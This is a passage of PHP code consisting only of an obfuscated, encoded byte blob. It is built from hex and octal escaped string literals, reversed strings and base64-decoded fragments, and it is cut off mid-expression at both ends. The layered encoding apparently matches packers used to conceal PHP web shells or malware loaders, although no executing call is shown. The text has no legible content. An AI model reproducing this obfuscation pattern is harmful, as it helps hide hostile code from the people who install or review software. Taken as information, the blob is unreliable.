56\x23\x1b\x66\x30\x8b\x28\x9b\x38\xeb\x24\x87\xfc\xa2\x1b\x34\x2a\xd4\xd7\xe8\x43\x9c\x30\x16\xf5\xb4\xc1\x8c\x90\xf5\x1c\xc9\x9\x4\xd1\x27\x1d"."\36\321\53\71\334\22\72\205\226\103\321\161\16\266\160\161\41\123\300\276\32\354\5\213\341\112\65\273\233\45\265\1\302\342\212\221\14\315\272\317\326\370\342\151\156\222\174\21\340\154\15\136".strrev('#$\\ßlÇ@(õ|ó¡¨+¦TrÜ»-×ïï’Ğ/ÍÌŞÊğ…‚2ÉÄê‚4K	ÒW¯')."\xb\xba\x7\x46\xb1\x64\xb1\x7b\x33\x53\x7c\xb3\x40\x82\xb0\x16\x80\xed\xc8\x2\x42\x57\x1a\xa5\xe6\x3\x5c\x94\x2a\xe5\xb3\xc\x8a\x82\x28\x4b\xac\x94\xc7\xb3\xdd\xe0\xec\xb3\x9e\x4f\x4b\x85\x16\x68\x29\x5b"."\252\125\355\203\101\365\211\361\320\246\213\164\75\15\367\317\374\322\50\15\103\6\126\266\335\211\3\250\377\136\216\26\150\172\221\254\220\266\210\35\53\160\23\250\322\222\356\210\307\4\106\341".strrev(',LpæÔ›„ŒH'."\r".'¦ª¸ÜŒE[ØØ*ÇâÉ_ãy ‹áifv5ejÀny#ÉyO-¨¤¾¸dâ').base64_decode('e7VQcrsEkf11BDrDajwelRyEkPumy9Ul0WY1GI0uCQMawsA3SFQTX9UTZ9I4Jq7s4QMe2Q==').base64_decode('JE2WQ7BDBcx64wqYbiJ8D7YFYtxgfravzlcv8qIPqvjCQCO7oR1PBGIV3GpQdxswKeBiAw==')."\12\264\105\227\51\301\150\244\253\275\43\116\275\111\120\170\107\124\112\47\146\321\220\314\234\156\224\47\103\365\241\316\110\40\30\122\302\35\211\50\273\360\300\55\123\311\125\227\70\217\263\41"."\x28\x5a\x3a\x77\xaa\x1\xe5\x69\x44\xbe\x8e\x23\xd7\xc8\x6b\x2\x34\xee\xf6\x54\xf7\x54\xf5\x4c\xeb\xa9\xe9\xa9\x5d\xe9\xeb\xb1\x7a\xfd\x12\x1f\x33\xe4\xe9\x81\x48\x67\x33\x74\xaf\x81\x87\xd2\x16\x2c\xe0\xf6".strrev('c×n¹Üª,Ä€<WÌú¼íB/óñÎæºïÖG÷xÚì'."\r".'0Á£8M)¬#0h'."\0".'8')."\353\167\156\334\272\163\35\210\30\312\356\255\17\356\330\376\370\256\215\133\306\357\274\162\347\246\207\167\135\175\66\115\170\347\226\273\307\57\330\302\33\246\274\163\331\143\73\327\337\304\305\27"."\52\265\170\120\351\167\316\271\150\327\366\73\261\360\162\343\351\73\357\277\160\347\346\213\306\57\370\321\370\125\133\166\255\337\72\176\303\131\343\347\136\264\173\353\345\307\271\21\211\306\273\331"."\124\300\265\141\377\51\370\226\64\35\336\36\153\72\36\332\132\364\133\203\257\121\240\137\146\15\116\54\204\117\352\12\165\4\103\356\373\110\162\24\74\222\114\243\30\102\355\143\100\136\265\300".strrev('\\Èa©FAæYi¿0ò–Ç	³ÖD)¨Ÿ>¡'."\n".'n0x¡Í1©(Ô¿Ì'."\r".'b¶Õï‹	£')."\xab\x38\x3a\xa2\xf9\x52\x66\xb6\x94\xcb\x93\xc6\x2a\x55\xd8\x58\xab\xca\x83\x79\x10\xb9\x1c\xa5\x54\x61\x7e\x8a\x0\x7a\xa\x2d\xbd\x1a\xec\x5b\x82\x18\xfa\x56\xaf\xa8\xf6\xd4\x79\xea\x6b\x15\x70\x2f\x43\x4b".base64_decode('gFMZpQrsxXk5x0c8SUes3lNXq1QVBqqgXWJcUetVmtNSNE8NNFhursiLqJllFzUDkTcl5Q==')."\341\40\136\36\375\72\34\305\244\174\242\4\235\47\224\303\15\123\2\35\315\316\234\324\277\114\147\65\261\263\114\371\154\356\244\202\115\163\165\255\222\204\353\17\25\22\111\61\307\140\64\72"."\x6\xa3\x66\x3a\xd0\x89\xce\x56\x3e\xdf\xf4\x6e\x83\x42\xef\xbc\xd1\x66\x69\x16\x9b\x28\x80\x92\xa9\xc2\x50\x3a\x5b\x2c\xaf\x89\xba\x81\x26\x87\xe6\x47\x1\x9e\x82\x6f\x1\xf0\x9a\x10\x39\xe2\x9\x6c\x6\x31"."\x9c\x4f\x62\x85\x34\xe2\xf8\xa7\x8a\xca\x83\xb4\x9f\x39\xab\x9f\x91\x3a\xb8\x5\xde\xbe\x82\xf7\x81\xe1\xb2\xc2\x84\x11\xee\x36\x8\xdf\xde\xb\x25\x82\x6d\x14\xcb\xe3\x12\x9a\xa7\x93\x53\x1c\x88\x2a\x86\x53".strrev('Ø‡ÉøcµPQò˜Õ*4¥¤±ù LSˆ€øjØ<ZÖôícD´wä8A0\\º>@Tß q').strrev(''."\r".'`ïd…¸–­ÕÏ '."\0".'*ÆŠ·û’¨?©«E#]rö`cCô(QÑ6$mRºÑWÈ%').base64_decode('sd1AH5KDTOaGJJ1kbrBQ5bjOYLSjJcwu6DUzzWnadGRqjoWxNwf4vsKqkq5Foogw0kCRwg==')."\160\232\207\305\35\175\234\300\171\76\212\10\226\217\42\234\331\340\134\222\277\56\374\375\170\7\17\13\121\27\105\272\342\354\176\6\246\276\313\232\171\270\215\137\247\306\11\321\230\24\11\304".base64_decode('Au1xHo0t4/c9OIze+1A7utoFxY8EliJkiQoBhVHrGt+0xbU99CodDdKfE1gMXy/qXV3vUQ==')."\xe6\xac\xad\x85\x3c\xdc\x31\x83\x9d\x31\xf2\x4c\xd6\xc4\x5f\x39\x29\xa2\x46\xa2\xad\x34\x4e\xfc\x88\x85\xf2\x69\xb1\x33\x51\xba\x15\x24\xf8\x26\x84\xe0\x6b\x31\xd6\xc5\x57\x83\x82\x70\x58\xa1\x17\x73\x95\x8e"."\xe8\xb2\x80\x70\x4d\x25\x25\x0\x44\x78\xaa\xf2\x9f\xd2\xdd\x33\xdc\xe3\x43\xc2\x82\xb5\x52\x5c\x8d\x6b\x6e\x52\x98\x18\x12\x24\x3b\x7b\xaa\x0\x80\xd2\x1\xc6\x46\x57\x7a\x80\x63\xa8\x59\xb3\x9f\xf9\x92\x41"."\x4\x91\x89\xb\xf4\x77\x39\xb\x10\x5a\x9\x5\xd0\x76\xb7\x90\x65\x77\xe4\xe8\xe5\x3c\xb5\x67\x4d\xcf\xd4\x1e\xaf\x8f\xde\x47\xc4\xc2\x4b\x8f\x47\x34\x49\xd\x2d\x47\x3c\x36\x1e\x77\x5c\xa6\x54\x89\x8b\x25".base64_decode('qB31EkJ01dLIQviBvddCEE8huqiRT2bopDUd6G9rYk0I/Y2gn0gCTZfBM6AlGQkvCa3B/w==').base64_decode('iIRaPpD02pGzQLhjDfoXEZg14Q53ZU2hxLJQiGZgYfgVWRHBga5KfubwHQBIFncCoGpVrQ==').base64_decode('IYPp7Z1eq6p+qwvwhXueqKmeXF8NPCQQDwrq60CIclwgFvtORODe0yDeGot2dUrxtsDScA==').base64_decode('RyuL+aex0DSoWmkOx9EQBRkyCqduchwETiIWyVKvA6WbEWVHEUlkx5sBSpmdq6ypKxxplg==')."\x2f\x8e\xe3\x8c\xc0\x50\x8\x55\x7\x9e\x32\x85\x35\x8e\xc5\xc9\x15\x72\x16\xc1\x43\xce\xc2\x4\xdd\x58\x84\x8c\x1\x8b\xd0\x1\x60\x31\x32\x5c\x2c\x42\x9c\xc7\xb1\x8\xe9\x28\x8b\xe0\xdd\x49\xa8\x83\xa5\xa1".base64_decode('PSLa37GNX0Yb4hcgF6STklsKTIN9VGeGnZOgXZzG9aMuNSfRUEkbf2rQp0gXsLG+VNIq+Q==')."\151\16\44\174\222\74\350\267\147\345\142\42\34\257\144\170\112\357\376\332\11\303\316\72\76\12\167\4\321\107\303\344\142\246\364\131\166\211\202\250\7\125\123\322\111\23\276\55\3\204\102\212"."\52\260\101\227\53\364\72\330\256\221\150\171\151\324\271\243\342\144\152\45\337\50\201\333\112\17\374\102\213\16\246\77\75\20\145\72\214\36\370\110\265\7\230\156\17\23\330\273\173\106\352\352".base64_decode('vOifeehvE/obRH9DGNDSMzK3BQXmt/T64ayC3cFw7rF7eqomGmTIwIYaolU0ykoZnHOmMg==')."\330\133\212\152\347\230\336\234\154\361\204\302\232\252\316\105\274\71\26\355\244\162\214\22\156\121\250\107\6\245\232\52\333\253\101\100\13\306\102\170\215\321\134\54\255\246\332\241\324\132\124\255"."\xc0\x2d\xed\x5a\x67\xa9\x70\x47\x73\x68\xb9\x52\x6d\xa4\x47\x54\x4d\x53\xa1\xb0\x82\x56\x34\xab\x48\x29\xab\x89\xd5\x40\xdb\xa\x7\x4d\x56\xc6\x1c\x56\x64\x24\x65\xbb\xee\x20\x85\x25\x4\xe2\x96\x9\x78\xc4".base64_decode('twK7EeuBrT1PoXI1TQrHEduPREhPUZJhYXHYo3AXCBiItzBUcQoVsQRaEU0KLU/EAhhIZA==')."\330\111\7\242\77\204\54\341\75\126\61\247\321\153\242\104\362\363\255\4\125\303\112\207\240\111\105\120\54\152\2\336\21\306\51\365\211\247\20\175\3\35\146\131\33\261\4\144\167\32\353\214"."\205\333\3\261\25\60\144\142\47\1\13\327\314\72\56\13\213\210\141\165\111\327\325\73\120\253\345\353\353\164\216\71\235\106\273\142\106\247\121\153\150\260\12\317\74\15\202\307\120\225\337\106"."\x66\xaa\x98\x1a\x76\xab\xd7\xc3\x2\xcc\x1d\x4\xb9\x29\xc5\xf4\x5d\x39\x44\xb8\x78\x4c\xcc\x1a\xe0\x3e\xcc\x8a\x9c\x2a\xdf\xf5\x12\x2e\x4d\x31\xab\xc5\x93\xcc\x78\x46\x4b\xa0\x2b\x22\x43\x60\xa8\x94\x25\xa1"."\25\137\262\106\130\113\53\255\21\226\306\224\72\174\265\101\177\152\146\103\377\250\243\212\232\31\150\147\133\312\143\27\54\334\153\42\264\12\70\164\127\42\252\42\56\24\13\141\236\0\75\342"."\303\52\265\127\332\275\313\223\2\325\340\14\334\77\354\227\164\215\345\251\324\65\136\236\353\257\102\35\255\341\216\120\143\373\150\70\36\150\127\130\303\101\103\207\175\45\316\203\172\302\121\65".strrev('e¥Ä”­$ÙÕÀrp€ˆB8ıˆ77çnÇ1&²œ’X»q	§ÄåáUSŞxv* £…ÂVUk$‚')."\246\7\345\135\376\56\15\263\1\247\340\314\124\326\131\40\262\253\216\217\273\355\257\145\260\60\15\27\307\277\354\270\231\373\162\203\2\135\222\223\2\134\130\141\37\44\347\101\171\147\363\20".base64_decode('m80yt0qqLnqT0y2LHwMnMrpiFfQU8aiogC8zJW3qlvAbDWNPdlssaGeEOwfZM2lzExvkUg==')."\336\216\353\131\120\343\67\47\211\15\276\270\24\47\56\41\111\266\371\344\64\106\314\34\165\22\347\52\10\65\205\371\320\110\271\4\60\42\134\221\342\303\17\121\147\57\323\31\210\361\30\63"."\x18\x13\x74\x1f\x23\xf2\x46\xe6\xcd\x4e\xbd\x98\x33\xc8\x89\xcf\x32\x71\xa0\xc3\xd3\x75\x19\x57\x2a\xcd\x5\xf3\x8c\x45\xbe\x20\xdd\x6c\xc4\x51\x98\x73\x7c\xa4\x29\x5d\x24\x29\xe5\x51\xbb\xbc\xf2\xd5\x24\x84"."\x3\x4\x28\x5d\x86\x60\x9e\xf1\x68\x6c\x2e\x33\xef\xd0\xd8\x42\x60\x36\x1e\xdc\xa\x84\xa5\xf8\x84\xbb\x1a\x52\x27\x96\x8e\xbc\xc2\x7d\x44\x5a\x93\xaf\x7e\x4a\x1e\xc4\x8f\x93\x67\x9c\x4c\x9d\xc0\xd1\x3e\x43"."\xf6\x25\xe1\x13\x5e\x59\x39\xda\x9f\xc0\x7\x1c\x5f\x89\x86\x73\x75\x2c\x78\xf7\xa9\x52\x5b\x3a\x79\xfe\x14\xf7\xcc\x4d\x47\x43\x1a\x66\x2\xa0\x41\xb2\x50\x95\x6\xd1\x88\x36\x3\xe3\xf1\xa8\x84\x3\x12\xb4".base64_decode('nblWAp+wEWZNg29z6DY41XLQmXAUyvp0fDWKXlQJcT+AqCB1mvbVhbokt7gTkIaK5YKQkQ==')."\x7f\xb0\x48\x94\x47\x5f\xfd\xc1\x98\x2e\xb8\x37\x2a\x46\x6e\xa2\x7d\x65\x21\x41\x2a\xc9\x97\x48\x21\x89\xbc\xba\xca\x10\x74\xa4\xb7\x66\x60\xe6\x33\x90\x2c\x70\xc\xd1\xf4\x8e\xa8\xda\x86\xd8\x46\x94\x9\x17"."\206\225\160\220\151\126\12\110\201\215\144\237\224\237\134\337\205\15\340\2\142\67\100\117\54\141\262\127\43\12\314\103\314\352\3\74\165\11\246\36\240\77\53\162\151\57\152\70\140\135\132\267".base64_decode('uaMkTM3YtUfcZukqdI4TymHJi6c2pOOLZ0y9UmYnA10p7xw0ER+DxaNdMXZWg+NYR6XGQg==').base64_decode('wRX82IRDWwJL3ZAw1jEGWiuCueYLw8kWU41FsYowFGlxFYi3ca+rTpgaCXcsqZiARIx2qQ==')."\10\5\206\23\241\166\67\314\131\103\74\24\210\61\217\276\70\336\24\211\6\245\344\160\264\174\44\270\14\303\201\124\301\110\201\376\123\152\172\126\223\335\115\3\332\344\244\327\140\115\204\127"."\xed\x9d\x5e\xbb\xb8\x67\x6d\x6d\x4d\x8f\x7f\xb1\x6f\x1a\x57\xa0\x51\x72\x25\x5d\xae\x9d\x0\x6c\x31\x26\xd2\xe0\x6\x60\xfe\xc3\x80\xb4\x18\xc4\xfc\x3e\x1f\x7c\x84\x7\xfc\x3d\x7e\xe6\x8d\xcb\x2f\x12\xe1\x57".base64_decode('5OfMAzxpx6lPI0cLXa4/2K16n/tamMrugjGSqvUxg4AwPYZV4yvifJKcMAcqUmSW7SJcmQ==')."\xd1\xdf\x4e\x39\x2b\x36\xc5\xa9\x98\xd1\x81\xcb\x8e\xdb\xcc\x32\xc8\x67\x98\x62\x99\x88\xf5\x9c\x36\x53\x25\xec\x45\x49\x4c\x8e\xb8\xfb\x8c\x40\x3e\x47\x15\x88\x92\xf\x88\xed\x3d\x2c\xc7\x38\x5b\xb6\x79\xc4".base64_decode('JIELB5HY2doWPnFJpL0j2nlSLJ7oWrps+QrwIdnAsKVP8TJlBjhK9Q9pRf8Q86K+FO8adA==').strrev('¦z9z±îìHb¼¿ÛK©öši=E‚~»ysùµ¢NWğÙ1SÁTfÇ2ØİˆúˆcK/Ë').strrev('âõ=À—l`#’cÏº”tiŒä„ò^ '."\0".'é:_Ê¶1ÜŞÊğº@•ìK6['."\n".'!õ').base64_decode('iMVj4Au0FfsCZX5AB4mHSrd7y0GvNuBIF16CB71om+mIu1xcTiU8oN3sL87w27jBecQ3oA==')."\x5\x20\x49\xc8\xab\x85\xf0\x12\x6e\xe1\x83\x39\x56\x9b\x6b\xad\x72\x20\xf7\x9d\x11\x27\x86\x8f\xd\xca\x2c\xf0\x8b\xde\x82\x64\xe7\xb4\xd2\x4d\xc5\x61\x50\xdd\x63\x11\x8c\xb8\xf6\xa6\x51\x8f\x22\xbc\x28\x33"."\xa5\xab\xd3\x3d\x32\x5b\x2e\xc4\x2f\x8e\x90\xb1\x53\xb2\xaf\x4\x46\x75\x73\x3\xc2\x94\x2c\x37\xc0\xcd\x3e\x52\xe\xa9\x3\x33\xf8\x16\xc9\xe2\x4c\x8\x16\xf0\x9e\x1\x4a\x6b\x1a\x65\x66\x5b\x70\xab\xb4\x69"."\64\46\275\324\342\360\123\41\277\0\241\25\12\301\14\356\203\143\15\73\100\51\71\302\150\150\37\66\132\221\215\135\234\276\232\121\162\63\225\362\322\74\277\45\102\34\223\372\44\34\53\253"."\1\111\204\371\20\273\110\137\226\212\304\107\103\44\177\171\133\332\311\60\363\314\164\276\200\224\245\31\357\260\330\342\234\72\342\65\55\313\133\50\232\330\246\255\321\310\365\373\255\141\110\313"."\x6a\x96\xbd\xd4\xe1\x55\xe8\x2b\x5d\x35\x63\x77\x19\xed\x5c\x9e\x86\x26\x8c\x78\x9\x76\xb3\x8f\x40\x51\xc\xf2\x17\xc9\xbb\x40\x9e\x61\x60\x23\x1e\xe2\xf6\x52\xad\x63\x88\xe3\x47\x6d\xf3\x63\xaf\x88\x44\xf0"."\345\246\150\321\70\73\357\161\366\236\132\7\111\133\152\160\314\306\335\23\163\347\305\302\303\61\125\323\323\160\210\273\217\101\362\173\240\37\173\17\61\363\354\275\222\320\110\301\264\164\331\205"."\x76\x5a\x27\xcd\xe5\x17\xe9\x25\xef\xd3\x39\x6d\x4\x2f\x79\x66\xad\x27\xf9\xa1\x46\x12\x61\x3f\x9f\x46\xe2\x59\x57\x76\x96\x88\x87\xdc\x9b\x73\xbc\x58\x40\x27\xc8\xe9\xdd\xd9\xd2\xf5\x1\x66\x5d\x28\x49\xf5"."\x7c\x93\xdf\xc9\xbd\x36\xbb\x3b\x86\x71\x43\xd0\xa1\x22\x77\xd9\x4d\xcf\x7a\xbd\x15\x1\x5e\xc9\xba\x90\xae\x42\xc9\x71\x3e\x6e\x1c\x6c\xff\x33\x64\x6c\x98\x5e\x80\xfe\x9c\x5c\xa9\xaf\xde\xa2\xf0\xa2\x8d\xe6"."\x92\xbe\x83\xb1\x44\x1f\x65\x8e\xa9\x5d\xc4\xd1\xe5\xcb\xba\xa7\xb5\xa7\xbd\x27\x21\xf\x8e\x5d\xd4\xfa\xfa\x50\x63\x25\xa7\xa9\x8e\xb6\x8\xd7\xd9\x80\x7b\xe4\xe9\xa\x36\x4\x13\x3b\xde\x86\x83\x8c\xa9\x15"."\375\166\103\142\214\366\75\210\67\153\43\370\201\7\341\265\263\53\26\161\234\116\101\126\326\313\261\214\67\310\314\277\314\122\66\115\66\300\350\123\146\166\110\127\304\71\365\316\53\256\337\171"."\xef\xe5\xbb\x1f\xbf\x76\xe7\xfa\x9b\x76\x3c\xb4\x6d\xe7\xe6\x47\x28\x9c\x8e\x5a\xb3\x9e\xe7\x98\xb2\xf3\xc2\x4b\x77\x6d\xfb\xe1\xee\x3b\x1f\x7f\xe7\x8a\x3b\x3f\x78\x74\xdd\xee\xad\xf\x62\x3b\xa4\xeb\x6e\xa2"."\146\111\343\33\316\334\171\371\135\343\33\56\330\175\377\331\73\37\271\170\347\17\317\172\347\252\213\337\76\375\114\130\153\171\342\76\64\120\354\57\211\161\242\105\166\136\377\350\370\243\33\336"."\xd9\x78\xd5\xee\xad\x5b\xa5\xfc\x36\xb6\x92\xcb\x4a\x8b\xd\xcd\xe4\xf8\xb9\xe7\xbc\x73\xd6\x96\xf1\xd\x97\xec\xda\x78\x5d\x59\x1\xfa\x1\xf7\x5c\xe3\xee\x5d\xfe\x83\x5d\x57\x9f\x2d\xa5\xb8\xb\x35\x11\xd7".base64_decode('2mLXz8vQhPGLL9r1k7vchahz+AqFdm46b8e2B1yFOsx4KZVpknx471x33vidV/OP7HjoIg==').base64_decode('aqTuKsLt4nh+Wn95/jjD6mZTtxAHbtfsFCz7XXc8htpDR0yeufGt5+66/oxdd5wPM3Hl1g==').base64_decode('8Ytv3nnHjbt+dCevFrDKYY6LK7j7zN0PnLPzigd4Rrzs04rIQzCK5sEG+eSDu7ZfsmvbZg==').base64_decode('jCQXnLnrzIfHN981/sPT+WfHH3pIjHLUT16AqkCeT8JwINB9wpK7UJIeIZNJIpbquH0n1g==').base64_decode('a1E//kxYIy734b2URrZo0Tjmm8w0jP3qKkRsqxqqJteg39oqTxXeupA4JrcYQNpR1TC5hg==').strrev('eSg;ÜµQ¡{r=(¿ˆ<\\«øgøgÌ.0˜¹ªt‡¨Œ]µ xX²ÉpÑÕÁj').base64_decode('T+vgwx0Ii5zSxlvCfLC3N0P1y72B9pO9whv5wsUjuawCOonG6npfXbXCHsVqrO5KtHjnVQ==')."\x2f\x5e\x34\x69\x61\x90\xd8\x38\xd8\x7a\x3b\x36\x52\xc0\x1a\x33\xaa\x2a\x5a\x4\x87\x8e\xb\x31\xdf\xe0\x11\xbf\x33\x36\x51\x59\x20\xb1\x39\x6d\xcc\xcc\x6b\xc3\x16\x62\xc2\x39\x5f\xa\x6\xb3\x8b\x33\x6a\xf1"."\x30\x0\x65\xd9\xf4\xa5\x11\x76\x2\xdc\xa1\xdb\xc3\x66\x51\x36\xfd\x9e\x51\x37\x4b\x26\xe4\x80\x34\x16\x70\x31\xea\x6b\x5f\x68\xc\x61\x5\x52\x7b\xcb\x8b\x2f\x2a\x5f\x7b\x50\x20\x49\x8d\xab\x1d\xd9\x1f\xbc".base64_decode('Z/yce9+54g53XqqSgrxYvi174pBeZhm/5Mry75H8zq+xzONnbN610ZWTGRkrku5RFCBEwA==')."\105\116\71\213\224\213\320\145\377\277\41\46\124\23\334\200\317\66\30\246\165\25\106\113\171\57\326\15\172\343\262\247\120\327\213\71\165\316\374\130\273\347\314\57\13\132\51\41\202\344\104\220"."\x3e\x90\xd4\xa0\xc8\xaf\x66\x49\xe\xcf\x89\xe6\x98\xf2\x78\x66\xf6\x5\x30\x2c\x83\x31\x90\x90\xc7\xfa\xc4\xd5\x1d\x2c\x56\xa9\x4e\xb1\xea\x4\x57\x7b\x31\x56\x7b\xd1\x1e\x9\x93\x1a\x44\xbf\x6c\x43\x7a\xa6"."\x40\xce\xe2\x7c\x77\xc9\xfd\x1a\x93\x7b\x14\x48\x11\xbc\x8e\xbc\xf2\x4b\x50\x23\x68\xaf\x8b\x93\xf1\x1b\x25\x5e\xbc\x94\xbc\x46\x7a\xa2\x14\x41\x3f\x2b\x36\x35\x5\xab\xb2\x52\x96\xae\x92\x91\x76\x7f\x92\x98"."\47\171\113\45\366\301\212\225\312\73\161\226\201\164\42\314\353\223\137\273\300\232\112\57\77\107\165\77\246\41\264\27\132\371\103\40\210\116\52\63\146\66\314\236\337\300\256\131\116\145\326\125"."\xa5\x2\xbb\x31\x81\x82\xec\xa1\x90\xe3\xfc\x7d\x8c\xe4\x8a\x87\x98\x58\xdf\xf0\x84\x4b\x4f\xaa\x38\xc0\x62\x18\x39\x31\x65\xb4\xda\x91\x4f\xb4\xd6\xf1\xa\x18\x74\x94\x2a\xcf\xa4\x37\x60\xc8\xe9\x17\x25\x51"."\xd8\xe6\x50\xe5\x6f\xe5\x54\x60\x5a\x69\x7d\x88\x89\x9f\x20\xba\x4b\xf\x91\xf2\x9\xe9\x67\x81\x22\xcf\xaf\x89\x25\x92\xcc\xe\x88\x9e\x10\xfa\x2\x18\x3e\x80\x1a\x6a\x8a\xad\x26\x11\xdb\xe5\xf3\xa2\x4c\x29"."\77\320\50\45\52\266\151\52\71\55\77\12\73\371\51\126\303\24\153\1\376\120\43\276\26\143\115\141\317\42\11\167\331\230\145\13\107\250\324\243\27\244\320\263\76\37\176\32\314\207\345\201"."\130\11\162\165\22\62\17\374\237\76\56\5\11\221\256\326\160\207\144\32\51\1\324\140\163\207\32\350\354\254\230\0\63\101\65\367\330\256\310\267\112\172\52\22\230\25\332\306\52\51\174\317"."\xaa\xb1\xa\x43\xab\x14\xab\x98\x62\x4e\xc3\xab\xfc\xc0\xb2\x48\x6\x21\x1f\x2e\x34\xa0\x48\x35\x2e\xa2\xf4\x21\x34\xf1\x92\x10\x4d\xae\x5e\xb4\xd0\x6f\x40\x49\x9f\xff\x78\x4c\xb6\xfd\xd8\xc6\x30\x3f\x15\x4f".base64_decode('omzyRKAtwimaoizUFDpcjdXkHKpaySAJhxtYL3IX7mAnxgv9mpyIF1DMZHttrucY4q4+Kw==')."\36\45\6\244\227\4\310\323\101\101\55\277\264\274\10\256\334\227\222\223\272\351\15\271\136\171\372\310\355\266\362\322\176\242\170\363\13\5\217\112\237\300\254\174\20\313\317\55\53\40\6\66".base64_decode('FkJ4zaw0tNQAxizBBqAZkNCJ1TU0wfF2ii1ZfZXw5U9yClYUb6KtXk0rwkLW2rXlMLAjdw==')."\x27\x5\xa\x86\x1b\x84\x31\xc8\xd\xc3\x6a\x33\x1\x43\xfc\xcc\xf9\x19\x8a\xbd\x72\x26\x1\x61\x79\xe8\xaf\x28\x13\xe9\x68\x15\x11\xaa\xe8\x70\x24\x76\x33\xb\x30\x12\xeb\xe9\xae\xf6\x4d\x5b\xbb\xd6\x6f\x30"."\153\113\146\323\305\312\372\170\156\32\357\361\71\363\243\236\300\320\363\214\0\160\347\244\42\373\211\260\10\47\371\247\211\13\253\334\252\122\301\246\226\215\215\213\272\271\10\325\313\322\124\242".strrev(',ıG ¡@á¥\'$¼X¾Ytà4Nˆù'."\n".'”3ZéËI×±ÁƒÆXœ«h†<ıFâIç’e')."\x82\x8f\xb\xb3\x46\xd2\xcf\x69\x4\x3d\x42\xf4\xa5\xc4\xad\x50\x96\x85\x50\x28\x17\x1c\x1b\x50\xba\x12\xf0\xd3\xd6\x4\x3c\x84\x48\xa8\x59\xe4\x34\x8d\xc3\x51\x5d\x1c\xc8\x3\xb\xad\x54\xd1\x28\xd8\xe\xea"."\106\137\23\256\42\57\217\255\322\206\64\232\245\112\1\315\146\143\25\171\217\243\12\121\63\232\302\110\32\157\312\102\114\317\220\364\233\155\254\42\315\265\62\272\216\312\23\212\125\351\43\250".base64_decode('YJXCaGpO4yNWtE3ELvlNQ3hKsSsGV7MCHXBEe/wp9Hfy8QyfyJufWSQWk4snhHoR2bsPaw==')."\xac\x69\x26\x78\xd2\xb1\x33\x16\x4d\x44\x83\xec\xd1\x36\xa7\x6a\x9b\xc2\x66\xb1\x7d\x84\x45\x6f\xd2\x8a\x1d\x28\xbb\x3e\xc8\x2d\xab\x58\xe\x2e\x40\xf8\x1\x2\xf3\x5e\x2c\xe5\xf3\xdc\xd4\x15\x63\x2d\xe7\x72"."\215\225\377\164\23\325\234\236\356\235\40\135\351\326\330\31\63\320\130\172\150\36\317\224\154\301\150\361\203\37\11\354\55\300\2\260\344\71\25\373\155\325\323\276\156\352\324\240\261\216\135\36"."\143\206\265\342\166\51\313\51\247\50\230\101\364\362\121\107\124\300\17\104\124\254\257\152\174\54\12\217\124\125\173\252\153\174\323\152\253\313\123\250\11\263\63\35\133\2\252\47\306\121\42\74"."\x9\x5\x8c\x9e\x5c\xd2\xc\x46\xc2\xa1\x8e\x84\x1a\x6\x1e\x5f\x3f\x63\xae\xaf\x4e\xdc\x9c\x34\x2c\xe1\xec\x98\x86\x83\xdc\x4\xab\xa8\x93\x51\xf5\x39\xba\x55\x61\x68\xe8\xf1\x54\x82\x1b\xe0\xea\x79\x87\x96"."\232\16\151\326\144\76\162\147\324\325\325\171\353\352\321\377\354\106\11\363\314\331\300\334\316\110\131\352\352\32\310\377\64\201\34\21\1\12\72\123\20\141\144\24\35\62\14\353\314\245\13\160"."\120\264\31\56\61\221\263\73\210\257\306\52\270\151\60\55\302\200\30\141\37\161\135\313\210\253\343\335\113\205\330\110\100\114\167\17\2\67\76\1\174\146\247\47\324\355\70\143\230\250\41\375"."\x64\x50\xa0\xbd\xfc\xa6\x35\xca\x26\x56\xcd\x2\x7a\xc9\xbd\x91\x37\x2a\x94\x4f\x77\xcb\x1f\xf3\xb1\xc1\xa5\x40\xe1\x80\xdf\xcb\x12\xbc\xf2\x23\x38\x50\x88\xb2\x4d\x71\xbc\xea\x68\x1a\x2a\xe3\xf4\x89\x8b\x21".strrev('DôpPªÃ˜Ì*Ò¼Ìü’ÕIk}^ÑÁP»–X“+¯Ì’TSåGçä¬bÆ“¤€b~ñI¾H')."\36\43\103\212\67\224\14\15\323\322\225\162\74\256\214\373\110\331\271\36\137\130\110\201\301\27\161\33\62\140\144\35\316\25\124\251\250\74\266\13\160\106\326\223\204\263\44\256\10\321\257\0"."\x7f\x71\x8a\xda\x6a\xb3\xb6\x29\x40\x51\x68\x94\xb8\xe3\x27\x2f\xeb\x52\x23\xfd\x86\x49\x65\x93\x6b\xbb\x27\x96\xcc\x91\xe3\xc0\xc7\x6d\x21\xc9\x62\xd2\x4c\xb1\xb3\xc0\xf8\x57\x18\x31\x32\x48\x88\x1\xe8\x29"."\x66\x90\x3b\xc4\x95\x2a\x70\x27\xb9\xca\x4\xe8\x11\x62\x59\x1\x80\x97\xe7\x26\x27\xad\x15\x72\x63\xb8\x2b\x37\x71\x7d\x1b\xe4\x1e\xbe\x65\x7f\xb8\x54\xbb\x24\x19\xd9\x59\xf0\x10\x89\xb0\x70\x62\x75\xc\x49"."\173\115\137\241\150\366\243\131\267\344\101\103\360\316\312\140\236\275\74\147\205\114\274\365\162\76\31\210\317\164\331\23\330\200\316\302\103\203\226\346\314\121\312\52\44\63\11\350\134\315\122\102".base64_decode('kD8MJwPx3lW2aSN7C2cdeFPshPCWfQnSMWWGDc+lyybbNJugSFjRJB+pqQ40YbjKTOjwCA==').base64_decode('CZsVJ5zCqLrBcVCeIIQuq7PX24EUkkWFK4iwV4jjDvfxgKYNTBaRiznT3jr3Eha4jOXCww==')."\312\25\323\362\121\44\36\122\125\326\4\341\25\335\306\137\4\257\200\210\116\144\53\303\52\302\267\161\5\15\234\24\112\61\134\73\73\5\106\173\145\213\352\65\75\30\254\320\147\262\225\274"."\316\375\142\70\47\125\56\0\317\263\231\110\172\304\336\265\345\102\270\256\56\27\211\132\342\240\210\274\255\124\164\143\146\274\312\24\337\14\60\61\236\302\336\146\241\364\130\30\244\370\241\333".base64_decode('3ahbvWjDI7gJTEg3pcasTtxkCKXZ/ChO7irxCkWuCHHdRAYrcXoV0swF5C2PCqnYBwn7Gg==').strrev('mÔWvûHAo%§1kñ¬¨¬ğ¯HYuM.ñ‚mòÈŒûÒÕÆI¾m1å